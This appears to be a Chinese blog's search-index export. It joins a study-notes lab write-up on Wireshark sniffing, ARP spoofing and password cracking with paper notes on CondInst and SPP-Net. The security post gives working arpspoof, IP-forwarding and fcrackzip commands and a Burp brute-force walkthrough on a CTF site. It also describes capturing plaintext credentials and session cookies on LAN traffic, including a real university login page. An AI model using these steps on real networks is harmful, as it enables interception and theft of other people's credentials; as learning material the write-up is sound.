每一个主机都有一个ARP高速缓存，此缓存中记录了最近一段时间内其它IP地址与其MAC地址的对应关系。如果本机想与某台主机通信，则首先在ARP高速缓存中查找此台主机的IP和MAC信息，如果存在，则直接利用此MAC地址构造以太帧；如果不存在，则向本网络上每一个主机广播一个ARP请求报文，其意义是&quot;如果你有此IP地址，请告诉我你的MAC地址&quot;，目的主机收到此请求包后，发送一个ARP响应报文，本机收到此响应后，把相关信息记录在ARP高速缓存中，以下的步骤同上。 ARP报文格式： 可以看出，ARP协议是有缺点的，第三方主机可以构造一个ARP欺骗报文，而源主机却无法分辨真假。如果发送者硬件地址字段填入攻击者的硬件地址，而发送者IP地址填入被假冒者的IP地址，那么就构造出了一个用于欺骗的ARP请求报文。那么被欺骗主机的ARP高速缓存，被假冒者的IP地址与其MAC地址的对应关系就会更改为欺骗者的，从而达到ARP欺骗的目的。特别的，如果攻击者冒充网关，将转发子网内到外网的所有通信量，以达到捕获其他主机的通信量，从而破坏数据传输的保密性。 ¶1x03 密码安全 在现实网络中，攻击事件发生的频率越来越高，其中相当多的都是由于网站密码泄露的缘故，或是人为因素导致，或是口令遭到破解，所以从某种角度而言，密码的安全问题不仅仅是技术上的问题，更主要的是人的安全意识问题。 口令破解方法 口令破解主要有两种方法：字典破解和暴力破解。 字典破解是指通过破解者对管理员的了解，猜测其可能使用某些信息作为密码，例如其姓名、生日、电话号码等，同时结合对密码长度的猜测，利用工具来生成密码破解字典。如果相关信息设置准确，字典破解的成功率很高，并且其速度快，因此字典破解是密码破解的首选。 而暴力破解是指对密码可能使用的字符和长度进行设定后（例如限定为所有英文字母和所有数字，长度不超过8），对所有可能的密码组合逐个实验。随着可能字符和可能长度的增加，存在的密码组合数量也会变得非常庞大，因此暴力破解往往需要花费很长的时间，尤其是在密码长度大于10，并且包含各种字符（英文字母、数字和标点符号）的情况下。 口令破解方式 口令破解主要有两种方式：离线破解和在线破解。 离线破解攻击者得到目标主机存放密码的文件后，就可以脱离目标主机，在其他计算机上通过口令破解程序穷举各种可能的口令，如果计算出的新密码与密码文件存放的密码相同，则口令已被破解。 候选口令产生器 候选口令产生器的作用是不断生成可能的口令。有几种方法产生候选口令，一种是用枚举法来构造候选口令（暴力破解），另一种方法是从一个字典文件里读取候选口令（字典破解）。 口令加密 口令加密过程就是用加密算法对从口令候选器送来的候选口令进行加密运算而得到密码。这要求加密算法要采用和目标主机一致的加密算法。加密算法有很多种，通常与操作系统或应用程序的类型和版本相关。 Burp Suite是一个用于测试Web应用程序安全性的图形工具。该工具使用Java编写，由PortSwigger Security开发。该工具有两个版本。可免费下载的免费版（免费版）和试用期后可购买的完整版（专业版）。免费版本功能显着降低。它的开发旨在为Web应用程序安全检查提供全面的解决方案，Burp Suite是进行Web应用安全测试集成平台。它将各种安全工具无缝地融合在一起，以支持整个测试过程中，从最初的映射和应用程序的攻击面分析，到发现和利用安全漏洞。 0x02 网络嗅探部分 ¶1x01 sinffer（Wireshark抓包） A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)。 我们选择Metasploit2主机作为A，Kali作为B。首先我们需要确认kali和Windows处于同一网段（可相互ping通的状态)。（PS：这一步是使用的Metasploit2，后面因为需要到网页里面提交数据就换成了win7） 接下来在kali中打开Wireshark，如果想要抓源只为A的数据，那么过滤语句为： ip.src == 10.34.80.4 接下来我们使用A去ping B观察一下wireshark的反应。 但是如果A ping的是百度，或者往某一个网址发送包含账号和密码的HTTP报文。就可以获取相应信息。 ¶1x02 ARP欺骗 关于ARP的原理已经攻击原理我在以前的一篇博客中有写到： 【白帽子学习笔记20】arp协议原理与攻击应用 为了欺骗B，让B把报文全部发到A这里来。A需要冒充局域网中交换机的角色。（此时B为Win7主机） 这一步我们需要使用一个工具就是arpspoof。在安装这个包的过程中可能会遇到一些坑。下面记录一下我遇到的一些问题。 建议更换kali源，否则有可能出现找不到的情况 安装过程使用sudo apt-get install dsniff而不是直接install arpspoof 这里我们使用单向攻击： 受攻击主机将数据发送到攻击主机，并由攻击主机转发至网关，网关将数据发送至服务器，服务器返回数据给网关，网关返回数据给受攻击主机 步骤如下： 开启端口转发，允许本机像路由器那样转发数据包 echo 1 &gt; /proc/sys/net/ipv4/ip_forward ARP投毒，向主机B声称自己(攻击者)就是网关 arpspoof -i eth0 -t IP1 IP2(IP1是我们的攻击目标、IP2是网关IP地址) 首先确认Win7的IP地址，然后确认网关地址。 接下来查询网关： wireshark抓包分析 我们使用Win7尝试访问一下百度。 接下来到wireshark里面看一下。修改wireshark的筛选规则为ip.src == 10.34.80.3。结果可以看到成功抓取到了数据！ 接下来我们选择一个网站输入以下账号密码。就选择大家&quot;最爱&quot;的X班吧. 我记得他的信息上传是没有加密的。 点击登陆； 之后在wireshark里查找发送到易班服务器的http post包。 但是最后发现某班的密码是加密发送的，所以账号密码信息还是不能获得。但是可以从包里面获取到cookie信息，这样再通过Chrome修改cookie的插件就可以完成免密登陆。 由于没有完成任务，我们切换到某大学的学生选课系统的登陆界面。 经过相同的操作之后抓到了包。 在数据报里面成功的发现我过程输入的账号和密码的明文信息。 ¶1x03 WireShark分析文件 1.如何发现有FTP服务器？且找到FTP服务器的IP地址？ 通过观察流量数据，可以发现有大量基于FTP协议传输的数据库，所以推测有FTP服务器。 通过对部分数据包的分析，比如如下两个： 可以知道192.168.182.1是FTP文件服务器。 2.客户端登陆FTP服务器的账号和密码分别是什么？ 通过这两个数据包可以确定服务器的账号和密码。 3.客户端从FTP下载或查看了2个文件，一个是zip文件，一个是txt文件，文件名分别是什么？ 在数据包中可以发现，用户分别查看了1.zip 和 复习题.txt 4.还原ZIP文件并打开 这里我们需要知道的一个知识是对FTP服务器的操作虽然是基于FTP协议解决的，但是真正在下载文件的时候还是使用tcp协议。所以需要zip数据包的时候需要在TCP数据包里面找，可以根据zip文件的文件头和文件尾快速的确认zip包的位置。 将原始数据另存为a.zip, 可以得到一个正常的压缩包，但是有密码。 我们使用kali下的fcrakzip密码破解工具，对zip进行破解。先sudo apt-get install fcrackzip安装 破解命令 fcrackzip -b -c1 -l 6 -u a.zip 接下来解释一下这个命令。 -b：使用暴力模式 -c1：使用纯数字进行破解 -l：规定破解密码长度/范围 -u：使用unzip 最后得到了我们的小企鹅。 5.TXT的内容是什么？ 通过追踪TXT信息，可以确定文件内容如下： 6. 网站密码破解部分： 为了合法的完成渗透测试报告，我们选择Bugku中一道需要运用到暴力破解的题目为例，解析一下如何运用Burp Suite爆破一个网站。 网站网址: http://123.206.87.240:8002/baopo/ 看到这个5位的密码，在检查源码和抓包之后都没有发现什么端倪，尝试bp一波 这里想尝试一下5位数字，5位字母需要的时间太长了. 使用BP自带的字典就可以满足我们的需求 这里可以根据Length的大小来判断时候爆破出密码，密码正确和密码错误的返回长度肯定是不一样的。 爆破成功啦！ ¶1x04 MD5破解 打开一个在线md5解密网站就可以解开简单的md5码。 ¶1x05 John the Ripper John the Ripper 是一款速度很快的密码破解工具，目前可用于 Unix、macOS、Windows、DOS、BeOS 与 OpenVMS 等多种操作系统。最初其主要目的是检测弱 Unix 密码，而现在，除了支持许多 Unix crypt(3) 密码哈希类型，John the Ripper “-jumbo”版本还支持数百种其它哈希类型和密码。 0x03 做有所得 ¶1x01 如何防止ARP攻击 终端对网关的绑定要坚实可靠，这个绑定能够抵制被病毒捣毁。 接入路由器或网关要对下面终端IP-MAC的识别始终保证唯一准确。 网络内要有一个最可依赖的机构，提供对网关IP-MAC最强大的保护。它既能够分发正确的网关信息，又能够对出现的假网关信息立即封杀。 ¶1x02 安全的密码（口令）应遵守的原则 避免出现弱密码 记住的密码才是好密码 每个平台密码最好能够有一定的区别 ¶1x03 字典的重要性 在破解密码或密钥时，逐一尝试用户自定义词典中的可能密码（单词或短语）的攻击方式。与暴力破解的区别是，暴力破解会逐一尝试所有可能的组合密码，而字典式攻击会使用一个预先定义好的单词列表（可能的密码）。对于暴力破解社会工程学是经常用到的方法。根据社会工程学生成的字典可以极大的增大密码破译的成功率。 ¶1x04 小结 通过本次的实验我们学习到了以下内容： 什么是网络嗅探 ARP协议原理 FTP协议 如何使用WireShark抓包并对数据包进行分析 MD5加密方式 如何使用密码字典爆破数据 密码安全 通过这次的实验我对网络嗅探有了比较充分的了解，对网络中的协议如ARP，FTP等又有了更深的了解。可以更加熟练的使用WireShark, 了解了暴力破解网站和压缩文件的基本操作。以及对于密码安全防护的意识加强。收益良多","categories":[{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://example.com/tags/security/"}]},{"title":"【论文阅读】Conditional Convolutions for InstanceSegmentation","slug":"【论文阅读】Conditional-Convolutions-for-InstanceSegmentation","date":"2020-10-29T22:57:18.000Z","updated":"2020-11-09T00:24:19.872Z","comments":true,"path":"2020/10/30/【论文阅读】Conditional-Convolutions-for-InstanceSegmentation/","link":"","permalink":"http://example.com/2020/10/30/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91Conditional-Convolutions-for-InstanceSegmentation/","excerpt":"0x01 概要 Mask R-CNN等性能最好的实例分割方法依赖于ROI操作（通常是ROIPool或roalign）来获得最终的实例掩码。相比之下，我们建议从一个新的角度来解决站姿分割问题。我们不使用实例级roi作为固定权重网络的输入，而是使用基于实例的动态感知网络。CondInst有两个优点：1）通过完全卷积网络。","text":"0x01 概要 Mask R-CNN等性能最好的实例分割方法依赖于ROI操作（通常是ROIPool或roalign）来获得最终的实例掩码。相比之下，我们建议从一个新的角度来解决站姿分割问题。我们不使用实例级roi作为固定权重网络的输入，而是使用基于实例的动态感知网络。CondInst有两个优点：1）通过完全卷积网络。 CondInst有两个优点： 1）通过完全卷积网络解决实例分割，消除了ROI裁剪和特征对齐的需要； 2）由于动态生成条件卷积的能力大大提高，掩模头可以非常紧凑（例如，3转换层，每个只有8个通道），导致明显更快的推断。 0x02 Mask-RCNN的缺点 实例分割是计算机视觉中的一项基本而又具有挑战性的任务，它需要一种算法来预测图像中每个感兴趣的实例的每像素掩模。尽管最近提出了一些工作，但实例分割的主流框架仍然是两阶段方法Mask R-CNN，它将实例分割转化为两阶段的检测和分割任务。Mask R-CNN首先使用一个更快的对象检测器R-CNN来预测每个实例的边界框。然后在每个实例中，使用roiallign操作从网络的特征图中裁剪出感兴趣的区域（roi）。为了预测每个实例的最终掩模，将一个紧凑的全卷积网络（FCN）（即掩模头）应用到这些roi上，以执行前景/背景分割。 1） 由于ROI通常是轴对齐的边界框，对于形状不规则的对象，它们可能包含大量不相关的图像内容，包括背景和其他实例。这个使用旋转roi可以缓解这个问题，但代价是更复杂的管道。 2） 为了区分前景实例和背景内容或实例，掩码头需要一个相对较大的接受域来编码足够大的上下文信息。因此，在掩模头中需要一组3×3的卷积（例如，掩模R-CNN中有4个3×3卷积，256个通道）。它大大增加了掩模头的计算复杂度，导致推理时间在实例数上有显著变化。 3） ROI的大小通常不同。为了在现代深度学习框架中使用有效的批处理计算，通常需要调整大小操作来将裁剪区域调整为相同大小的补丁。例如，Mask R-CNN会将所有裁剪区域的大小调整为14×14（使用反褶积将采样率提高到28×28），这限制了实例分段的输出分辨率，因为大型实例需要更高的分辨率来保留边界的细节 0x03 为什么FCNs在实例分割上的效果不好 我们发现，将模糊神经网络应用于实例分割的主要困难在于相似图像的出现可能需要不同的预测，但FCNs难以实现这一点。例如，如果在一个input image中有两个外观相似的人A和B，那么在预测A的实例掩码时，FCN需要将B预测为background w.r.t.A，这可能很困难，因为它们在外观。因此，ROI操作用于裁剪感兴趣的人，即A；并过滤掉B，实例分段需要两种类型的in队形： 1） 用于对对象进行分类的外观信息； 2）用于区分属于同一类别的多个对象的位置信息。几乎所有的方法都依赖于ROI裁剪，对实例的位置信息进行显式编码。相比之下，CondInst通过使用敏感卷积滤波器以及显示在特征地图上的相对坐标来利用位置信息。 因此，我们提倡一种新的解决方案，即使用实例感知FCNs进行实例任务预测。换言之，与使用一组固定卷积滤波器的标准ConvNet作为掩码头来预测所有实例，而是根据要预测的实例来调整网络参数。在动态过滤网络[20]和CondConv[41]的启发下，对于每个实例，控制器子网络（见图3）动态生成掩码FCN网络参数（以实例的中心区域为条件），然后使用该参数预测该实例的掩码。预计网络参数可以对该实例的特征（例如相对位置、形状和外观）进行编码，并且只对该实例的像素进行激发，从而绕过了上述困难。这些条件掩模头被应用到整个特征映射中，消除了对ROI操作的需要。乍一看，这个想法可能行不通，因为如果某些图像包含多达几十个实例，则实例掩码头可能会产生大量的网络参数。然而，我们发现，一个非常紧凑的FCN掩模头和动态生成的滤波器已经可以优于先前基于ROI的mask R-CNN，从而大大降低了Mask-CNN中掩模头的每一瞬间的计算复杂度。 0x04 主要贡献 试图从一个新的角度来解决实例分割问题。为此，我们提出了CondInst实例分割框架，该框架比现有的Mask R-CNN等方法在提高实例分割速度的同时，提高了实例分割的性能。据我们所知，这是第一次一个新的实例分割框架在精确度和速度上都优于最新的技术 CondInst是完全卷积的，并且避免了许多现有方法中使用的上述调整大小操作，因为CondInst不依赖ROI。不必调整特征图的大小，就可以获得高分辨率的分辨率，并具有更精确的边缘。 与以前的方法不同，一旦训练完所有实例，掩码头中的过滤器都是固定的，而我们的掩码头中的过滤器是动态生成的，并根据实例进行调整。因此，只需记住一个过滤器，就可以大大减少所要求的过滤器的负载。因此，Mask head 可以非常轻量，显著减少推理时间。与bounding box检测器FCOS相比，CondInst只需要多10%的计算时间，甚至可以处理每个图像的最大实例数（即100个实例）。 0x05 CondInst的实例分割 ¶1x01 网络总体结构 回想一下mask R-CNN使用一个对象检测器来预测输入图像中实例的边界框。边界框实际上就是掩码R-CNN表示实例的方式。类似地，CondInst使用实例感知过滤器来表示实例。换句话说，CondInst没有将实例概念编码到边界框中，而是隐式地将其编码到掩码头的参数中，这是一种更灵活的方式。例如，它可以很容易地表示不规则的形状，而这些不规则形状是很难被表示的,）被边界框紧紧包围。这是CondInst相对于以前基于ROI的方法的优势之一。 与基于ROI的方法获取边界框的方式类似，实例感知滤波器也可以通过对象检测器获得。在这项工作中，由于CondInst的简单性和灵活性，CondInst在流行的目标检测器FCOS上构建CondInst。同时，在FCOS中消除锚盒也可以节省参数的数目和条件的计算量。如图 利用特征金字塔网络的特征映射{P3、P4、P5、P6、P7}，其下采样率分别为8、16、32、64和128。如图3所示，在FPN的每个特征层上，应用一些功能层（在虚线框中）来进行实例相关的预测。例如，目标实例的类和实例的动态生成的筛选器。从这个意义上讲，CondInst可以看作是Mask R-CNN，它们都是先处理图像中的实例，然后预测实例的像素级掩码（即实例优先），除了检测器，如图所示，还有一个掩模分支，它提供了我们生成的掩码头作为输入来预测所需实例掩码的特征映射。 特征图表示为： 掩模分支连接到FPN level p3，因此其输出分辨率为输入图像分辨率的18。掩模分支在最后一层之前有四个3×3的卷积，有128个通道。之后，为了减少生成参数的数量，掩码分支的最后一层将信道数从128减少到8（即，Cmask＝8）。令人惊讶的是，使用cmask=8已经可以获得优异的性能，而使用更大的cmask（例如16）并不能提高性能，如我们的实验所示。更严重的是，使用cmask=2只会使mask AP的性能降低0.3%。此外，如图3所示，fmaski与坐标图相结合，这些坐标是fmask上所有位置到位置（x，y）的相对坐标（即，生成遮罩头的滤波器的位置）。然后，将组合发送到掩码头以预测实例掩码。如我们的实验所示，相对坐标为预测实例掩模提供了强有力的线索。此外，单个sigmoid被用作掩模头的最终输出，因此掩模预测是类无关的。实例的类别由分类头与控制器并行预测。 原始掩模预测的分辨率与F mask的分辨率相同，后者是输入图像分辨率的八分之一。为了产生高分辨率的实例掩模，使用双线性上采样将maskprediction上采样到4，得到400×512掩模预测（如果输入图像大小为800×1024）。我们将在实验中证明上采样对CondInst的最终瞬间分段性能至关重要。需要注意的是，该掩模的分辨率比掩模R-CNN（如前所述仅为28×28）高得多。 ¶1x02 网络输出和训练标签 CondInst 具有如下的输出头： Classiofication Head： 分类头预测实例的分类，ground-truth标签为类别信息或者0（背景）即背景）。在FCOS中，网络预测一个C-D vector px,yp_{x,y}px,y​用于分类，每个元素在px,yp_{x,y}px,y​对应于一个二进制分类器，其中C表示类别的数量。 Controller Head 控制器头与上述分类头具有相同的结构，用于预测该位置实例的Mask head的参数。Mask head 预测这个物体Mask。为了预测参数，我们将滤波器的所有参数（即权重和偏差）串联在一起作为一个N-D向量 θx,y\\theta_{x,y}θx,y​，其中N是参数的总数。因此，控制器头部没有输出信道。掩模头是一种非常紧凑的fcn结构，它有三个1×1的卷积，每个卷积有8个通道，除了最后一个外，都使用ReLU作为激活函数。这里没有使用诸如批处理规范化之类的规范化层。最后一层有1个输出信道，使用sigmoid来预测前景的概率。任务头总共有169个参数（#权重=（8+2）×8（conv1）+8×8（conv2）+8×1（conv3）和#biaes=8（conv1）+8（conv2）+1（conv3））。如前所述，生成的过滤器包含关于实例所在位置的信息，因此，理想情况下，带有过滤器的遮罩头将只对实例的像素点进行触发，甚至将整个特征映射作为输入。 Center-ness and Box Heads. 从概念上讲，CondInst可以消除box head，因为CondInst不需要ROIs。然而，我们发现如果使用基于Box的NMS，推理时间将大大减少。因此，我们仍然预测CondInst中的Box。我们要强调的是，预测框仅在NMS中使用，不涉及任何ROI操作。 ¶1x03 损失函数 ¶1x04 推理 给定一幅输入图像，通过网络进行转发，得到包含分类置信度的输出px,yp_{x,y}px,y​, 中心度得分，box预测 tx,yt_{x,y}tx,y​和生成的参数θx,y\\theta_{x,y}θx,y​, 我们首先按照FCOS中的步骤来获得Box。然后，使用阈值为0.6的基于Box的NMS来消除重复检测，然后使用前100个框计算掩码。与FCOS不同，这些方框还与控制器生成的过滤器相关联。让我们假设在NMS之后还有K个box，因此我们有生成的K个过滤器组。这一组滤波器用于产生特定于实例的Mask-head。这些特定于实例的掩码头以FCNs的方式应用于与Fx,yF_{x,y}Fx,y​（即FmaskF_{mask}Fmask​,Ox,yO_{x,y}Ox,y​的组合）来预测实例的掩码。由于任务头是一个非常紧凑的网络（3个1×1卷积，共有8个信道和169个参数），计算掩码的开销非常小。例如，即使有100次检测（即MS-COCO上每个图像的最大检测次数），掩模头上总共也只有不到5毫秒的时间，这只给基本检测器FCOS增加了10%的计算时间。相比之下，Mask R-CNN的Mask head有4个3×3的256个通道，参数大于2.3M，计算时间较长。 0x06 小结 提出了一个新的更简单的实例分割框架Condinst。不同于以往的方法，如Mask R-CNN，它使用固定权重的任务头，CondInst将掩码头设置在实例上，并动态生成掩码头的过滤器。这不仅降低了掩模头的参数和计算复杂度，而且消除了ROI操作，从而形成了一个更快、更简单的实例分割框架。","categories":[{"name":"CV","slug":"CV","permalink":"http://example.com/categories/CV/"}],"tags":[{"name":"CV","slug":"CV","permalink":"http://example.com/tags/CV/"}]},{"title":"空间金字塔池化网络SPP-Net","slug":"空间金字塔池化网络SPP-Net","date":"2020-10-29T12:57:31.000Z","updated":"2020-11-09T00:24:27.258Z","comments":true,"path":"2020/10/29/空间金字塔池化网络SPP-Net/","link":"","permalink":"http://example.com/2020/10/29/%E7%A9%BA%E9%97%B4%E9%87%91%E5%AD%97%E5%A1%94%E6%B1%A0%E5%8C%96%E7%BD%91%E7%BB%9CSPP-Net/","excerpt":"@[toc] ¶0x01概要介绍 现有的深卷积神经网络（CNNs）需要一个固定大小（如224×224）的输入图像。这种要求是“人为的”，可能会降低对任意大小/比例的图像或子图像的识别精度。在这项工作中，我们为网络配备了另一种池策略“空间金字塔池”，以消除上述要求。这种新的网络结构称为SPP网，它可以生成一个固定长度的表示，而不考虑图像的大小/比例。金字塔池对对象变形也很健壮。有了这些优势，SPP网应该在总体上改进所有基于CNN的图像分类方法。","text":"@[toc] ¶0x01概要介绍 现有的深卷积神经网络（CNNs）需要一个固定大小（如224×224）的输入图像。这种要求是“人为的”，可能会降低对任意大小/比例的图像或子图像的识别精度。在这项工作中，我们为网络配备了另一种池策略“空间金字塔池”，以消除上述要求。这种新的网络结构称为SPP网，它可以生成一个固定长度的表示，而不考虑图像的大小/比例。金字塔池对对象变形也很健壮。有了这些优势，SPP网应该在总体上改进所有基于CNN的图像分类方法。 SPP-net使用单一的完整图像表示而不是精细的方法实现了最先进的分类结果-调音SPP网络的强大功能在目标检测中也很重要。利用SPP网络，我们只需计算一次来自整个图像的特征映射，然后将任意区域（子图像）的特征集合起来生成固定长度的表示，以训练检测器。该方法避免了重复计算卷积特征。在处理测试图像时，我们的方法比R-CNN方法快24-102倍 引出SPP-Net的原因： 在cnn的训练和测试中存在一个技术问题：目前流行的CNNs要求输入图像大小固定（如224×224），这既限制了输入的纵横比，也限制了输入的规模图像。什么时候对于任意大小的图像，当前的方法大多是将输入图像调整为固定大小，通过裁剪或通过翘曲，如图所示。但是裁剪区域可能不包含整个对象，而扭曲的内容可能会导致不需要的几何图形扭曲。识别由于内容丢失或失真，精度可能会受到影响。 为什么需要固定尺寸？ cnn主要由两部分组成：卷积层和随后的完全连接层。卷积层以滑动窗口方式操作，并输出表示激活的空间排列的特征图（图2）。事实上，旋转层不需要固定的图像大小，可以生成任何尺寸的特征图。另一方面，完全连接的层需要有固定大小/长度的定义输入。因此，固定大小约束仅来自完全连接层. 输入本文引入空间金字塔池（SPP）来取消网络固定规模约束 ¶0x02 SPP-Net 我添加了最后一个卷积层上的SPP层。spp层将特征集合起来，生成固定长度的输出，然后输入到完全连接的层（或其他分类器）。换句话说，我们在网络层次结构的高级阶段（在进化层和完全连接层之间）执行一些信息“聚合”，以避免在开始。图1（底部）通过引入SPP层显示了网络体系结构的变化。我们称之为新的网络结构spp-net SPP的优点 SPP对于深层CNN有几个显著的特性：1）SPP能够生成固定长度的输出，而不考虑输入大小，而以前的deepnetworks中使用的滑动窗口池[3]不能；2）SPP使用多级而滑动窗口池只使用单个窗口大小。多层池对物体变形具有很强的鲁棒性[15]；3）由于输入尺度的灵活性，在可变尺度下提取的SPPcan池特征。实验表明，这些因素都提高了深层网络的识别精度。 SPP-net不仅可以从任意大小的图像/窗口生成测试的表示，而且还允许我们在训练期间提供不同大小或比例的图像。使用可变大小的图像进行训练可以提高尺度不变性并减少过拟合。我们开发了一种简单的多尺寸采集方法。当我们接受一个网络输入的单一变量时，我们使用一个固定的网络大小来训练它。在每一个纪元中，我们用一个给定的输入大小训练网络，然后切换到另一个输入大小来进行下一步操作。实验表明，这种多尺度训练与传统的单尺度训练一样收敛，具有更好的测试精度。 与R-CNN对对比： R-CNN中的特征计算是非常耗时的，因为它反复地将深度卷积网络应用于每幅图像上数千个扭曲区域的原始像素。Spp-Net可以在整个图像上运行卷积层（不考虑窗口数），然后通过SPP网络在特征地图上提取特征。注意 在特征地图（而不是图像区域）上训练/运行探测器实际上是一个更流行的想法。 但SPP网络继承了CNN深层特征映射的强大功能，同时也继承了SPP在任意窗口大小下的灵活性，从而使SPP网络具有了卓越的精度和效率。在我们的实验中，基于SPP网络的系统（建立在CNN管道上）计算的特征比R-CNN快24-102倍，具有更好的或可比性准确。有SPP网络可以促进更深层和更大的各种网络. ¶0x03 网络结构 ¶1x01 卷积层和特征图 考虑一下流行的七层架构，前五层是卷积的，其中一些是池层。这些池层也可以被认为是“卷积的”，因为它们使用的是滑动窗口。 最后的两层是完全连接的，以N路softmax作为输出，其中N是类别的数目。 上面描述的深度网络需要一个fixedimage大小。然而，我们注意到，固定尺寸的要求仅仅是由于完全连接的层需要固定长度向量作为输入。另一方面，卷积层接受轨道尺寸的输入。卷积层使用滑动过滤器，其输出与输入的aspectratio大致相同。这些输出被称为特征映射[1]——它们不仅涉及到响应的强度，而且涉及到它们的空间位置。 将一些特征地图可视化。它们是由conv5layer的一些过滤器生成的。图2（c）显示了ImageNet数据集中这些过滤器的最强激活图像。我们看到过滤器可以被一些语义内容激活。例如，第55个滤波器（图2，左下角）最易被圆形激活；第66个滤波器（图2，右上角）最易被∧形激活；第118个滤波器（图2，右下角）最易被a∨激活-形状。这些输入图像中的形状（图2（a））激活相应位置的特征映射（图2中的箭头） 生成图2中的featuremaps，而不需要固定输入大小。这些由深卷积层生成的特征映射与传统方法中的特征映射相似[27]，[28]。在这些方法中，SIFT向量[29]或图像块[28]被密集地提取和编码，例如通过矢量量化、稀疏编码或费希尔核进行编码。这些编码的特征由特征映射组成，然后由词包（BoW）或空间金字塔集合。类似地，深卷积特征可以以类似的方式汇集在一起。 ¶1x02 空间金字塔池层 这样的向量可以通过单词包（BoW）方法生成，该方法将这些特征集合在一起。空间金字塔池[14]，[15]改进了BoW，因为它可以通过在局部空间容器中的池来保持空间信息。这些空间存储单元的大小与图像大小成比例，因此无论图像大小，存储单元的数量都是固定的。这与以前的深层网络的滑动窗口池[3]不同，其中滑动窗口的数量取决于输入大小。到对于任意大小的图像采用深网络，我们将最后一个池层（例如，在最后一个卷积层之后的pool5）替换为aspatialpyramd池层。图3说明了方法。输入每一个空间单元，我们将每个滤波器的响应集中起来（在本文中我们使用最大池），空间金字塔池的输出是km维向量，其中格数表示为sm（kis是最后一个卷积层中的滤波器数）。固定维向量被输入到全连通层。 ¶0x04 训练网络 Spp-Net的训练过程分为两部 ¶1x01 单一尺度训练——single-size 所谓单一尺寸训练指的是先只对一种固定输入图像进行训练，比如224 x 224，在conv5之后的特征图为：13x13这就是我们的（a x a）而我要得到的输出为4 x 4，2 x 2,1 x 1，怎么办呢？这里金字塔层bins即为 n x n，也就是4 x 4，2 x 2,1 x 1，我们要做的就是如何根据a和n设计一个池化层，使得a x a的输入能够得到n x n的输出。实际上这个池化层很好设计，我们称这个大小和步幅会变化的池化层为sliding window pooling。 它的大小为：windows_size=[a/n] 向上取整 ， stride_size=[a/n]向下取整。数据实验如下： 当a x a为13 x 13时，要得到4 x 4的输出，池化层的大小为4，移动步幅为3； 当a x a为13 x 13时，要得到2 x 2的输出，池化层的大小为7，移动步幅为6； 当a x a为13 x 13时，要得到1 x 1的输出，池化层的大小为13，移动步幅为13； 有的小伙伴一定发现，那如果我的输入a x a变化为10 x 10呢，此时再用上面的三个池化核好像得不到固定的理想输出啊，事实上的确如此，这是训练的第二个过程要讲的，因为此过程称之为“单一尺度训练”，针对的就是某一个固定的输入尺度而言的。 ¶1x02 多尺寸训练——multi-size（以两种尺度为例） 虽然带有SPP（空间金字塔）的网络可以应用于任意尺寸，为了解决不同图像尺寸的训练问题，我们往往还是会考虑一些预设好的尺寸，而不是一些尺寸种类太多，毫无章法的输入尺寸。现在考虑这两个尺寸：180×180,224×224，此处只考虑这两个。 我们使用缩放而不是裁剪，将前述的224的区域图像变成180大小。这样，不同尺度的区域仅仅是分辨率上的不同，而不是内容和布局上的不同。 那么对于接受180输入的网络，我们实现另一个固定尺寸的网络。在论文中，conv5输出的特征图尺寸是axa=10×10。我们仍然使用windows_size=[a/n] 向上取整 ， stride_size=[a/n]向下取整，实现每个金字塔池化层。这个180网络的空间金字塔层的输出的大小就和224网络的一样了。 当a x a为10 x 10时，要得到4 x 4的输出，池化层的大小为3，移动步幅为2（注意：此处根据这样的一个池化层，10 x 10的输入好像并得不到4 x 4的输出，9 x 9或者是11 x 11的倒可以得到4 x 4的）这个地方我也还不是特别清楚这个点，后面我会说出我的个人理解。 当a x a为10 x 10时，要得到2 x 2的输出，池化层的大小为5，移动步幅为5； 当a x a为10 x 10时，要得到1 x 1的输出，池化层的大小为10，移动步幅为10； 这样，这个180网络就和224网络拥有一样的参数了。换句话说，训练过程中，我们通过使用共享参数的两个固定尺寸的网络实现了不同输入尺寸的SPP-net。 为了降低从一个网络（比如224）向另一个网络（比如180）切换的开销，我们在每个网络上训练一个完整的epoch，然后在下一个完成的epoch再切换到另一个网络（权重保留）。依此往复。实验中我们发现多尺寸训练的收敛速度和单尺寸差不多。 多尺寸训练的主要目的是在保证已经充分利用现在被较好优化的固定尺寸网络实现的同时，模拟不同的输入尺寸。除了上述两个尺度的实现，我们也在每个epoch中测试了不同的s x s输入，s是从180到224之间均匀选取的。后面将在实验部分报告这些测试的结果。 注意，上面的单尺寸或多尺寸解析度只用于训练。在测试阶段，是直接对各种尺寸的图像应用SPP-net的。 ¶0x05 Spp-Net在目标检测上的应用 SPP网络，这个方法的思想在R-CNN、Fast RCNN， Faster RCNN上都起了举足轻重的作用，对于检测算法，论文中是这样做到：使用ss生成~2k个候选框，缩放图像min(w,h)=s之后提取特征，每个候选框使用一个4层的空间金字塔池化特征，网络使用的是ZF-5的SPPNet形式。之后将12800d的特征输入全连接层，SVM的输入为全连接层的输出。这个算法可以应用到多尺度的特征提取：先将图片resize到五个尺度：480，576，688，864，1200，加自己6个。然后在map window to feature map一步中，选择ROI框尺度在｛6个尺度｝中大小最接近224x224的那个尺度下的feature maps中提取对应的roi feature。这样做可以提高系统的准确率。","categories":[{"name":"CV","slug":"CV","permalink":"http://example.com/categories/CV/"}],"tags":[{"name":"CV","slug":"CV","permalink":"http://example.com/tags/CV/"}]},{"title":"【白帽子学习笔记】网络扫描与网络侦查","slug":"【白帽子学习笔记】网络扫描与网络侦查","date":"2020-10-29T03:17:44.000Z","updated":"2020-12-19T05:03:41.055Z","comments":true,"path":"2020/10/29/【白帽子学习笔记】网络扫描与网络侦查/","link":"","permalink":"http://example.com/2020/10/29/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E6%9F%A5/","excerpt":"[toc] 0x01网络扫描与网络侦查的目的 黑客在进行一次完整的攻击之前除了确定攻击目标之外，最主要的工作就是收集尽量多的关于攻击目标的信息。这些信息主要包括目标的操作系统类型及版本、目标提供哪些服务、各服务的类型、版本以及相关的社会信息。 攻击者搜集目标信息一般采用七个基本的步骤： （1） 找到初始信息，比如一个IP地址或者一个域名； （2） 找到网络地址范围，或者子网掩码； （3） 找到活动机器； 